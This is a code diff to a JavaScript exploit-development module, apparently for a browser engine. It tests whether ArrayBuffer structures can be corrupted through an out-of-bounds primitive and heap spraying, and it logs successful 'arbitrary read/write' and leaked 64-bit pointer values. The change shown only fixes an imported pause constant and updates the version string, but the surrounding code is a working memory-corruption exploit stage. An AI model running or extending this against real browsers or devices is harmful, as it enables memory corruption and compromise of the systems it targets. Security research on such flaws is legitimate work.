@@ -1,5 +1,6 @@
 // js/script3/testCorruptArrayBufferStructure.mjs
-import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
+// CORREÇÃO: Adicionar LONG_PAUSE_S3 à importação
+import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3, LONG_PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
 import {
     triggerOOB_primitive, oob_array_buffer_real,
@@ -44,7 +45,7 @@ async function attemptReadWriteOnCorruptedBuffer(ab, originalSize, newExpectedSi
 
             if (readBack === testWriteVal) {
                 logFn(`    ---> LEITURA/ESCRITA ARBITRÁRIA (NOVO TAMANHO) OBTIDA! Leu ${toHex(readBack)} de offset ${readOffsetBeyondOriginal}`, "critical", FNAME_PARENT);
-                if (readOffsetBeyondOriginal + 8 <= ab.byteLength) { // Checa se há espaço para ler 64 bits
+                if (readOffsetBeyondOriginal + 8 <= ab.byteLength) {
                     const pLow = corruptedDv.getUint32(readOffsetBeyondOriginal, true);
                     const pHigh = corruptedDv.getUint32(readOffsetBeyondOriginal + 4, true);
                     logFn(`       Lido como U64 em ${readOffsetBeyondOriginal}: H=${toHex(pHigh)} L=${toHex(pLow)}`, "leak", FNAME_PARENT);
@@ -62,7 +63,7 @@ async function attemptReadWriteOnCorruptedBuffer(ab, originalSize, newExpectedSi
     return false;
 }
 
-const LONG_PAUSE_S3_AB_CORRUPT_LOCAL = 2000;
+// LONG_PAUSE_S3 será importado de s3_utils.mjs
 
 export async function testCorruptArrayBufferStructure() {
     const FNAME = "testCorruptArrayBufferStructure";
@@ -82,7 +83,7 @@ export async function testCorruptArrayBufferStructure() {
         attempts: 1,
     };
 
-    logS3(`--- Iniciando Teste de Corrupção de Estrutura de ArrayBuffer (S3) (v2.4.1) ---`, "test", FNAME);
+    logS3(`--- Iniciando Teste de Corrupção de Estrutura de ArrayBuffer (S3) (v2.4.2) ---`, "test", FNAME);
     logS3(`   Config: Spray=${CORRUPTION_AB_CONFIG.spray_count}x${CORRUPTION_AB_CONFIG.victim_ab_size}B, SizeFieldOffset=${toHex(CORRUPTION_AB_CONFIG.size_field_offset_in_ab_object)}, DataPtrFieldOffset=${toHex(CORRUPTION_AB_CONFIG.data_ptr_field_offset_in_ab_object)}`, "info", FNAME);
 
     let successfulCorruptionsFound = 0;
@@ -103,7 +104,8 @@ export async function testCorruptArrayBufferStructure() {
             clearOOBEnvironment();
             continue;
         }
-        await PAUSE_S3(LONG_PAUSE_S3_AB_CORRUPT_LOCAL);
+        // Usar LONG_PAUSE_S3 importado
+        await PAUSE_S3(LONG_PAUSE_S3);
 
         for (let baseCandidateOffsetForVictimAB = CORRUPTION_AB_CONFIG.search_base_offset_start;
              baseCandidateOffsetForVictimAB < CORRUPTION_AB_CONFIG.search_base_offset_end;
@@ -181,7 +183,8 @@ export async function testCorruptArrayBufferStructure() {
         clearOOBEnvironment();
         if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
         logS3(`Fim da Tentativa #${attempt + 1}. Pausando antes da próxima...`);
-        if (attempt + 1 < CORRUPTION_AB_CONFIG.attempts) await PAUSE_S3(LONG_PAUSE_S3_AB_CORRUPT_LOCAL * 2);
+        // Usar LONG_PAUSE_S3 importado
+        if (attempt + 1 < CORRUPTION_AB_CONFIG.attempts) await PAUSE_S3(LONG_PAUSE_S3 * 2);
     }
 
     logS3(`--- Teste de Corrupção de Estrutura de ArrayBuffer Concluído (Sucessos de Corrupção Encontrados: ${successfulCorruptionsFound}) ---`, "test", FNAME);
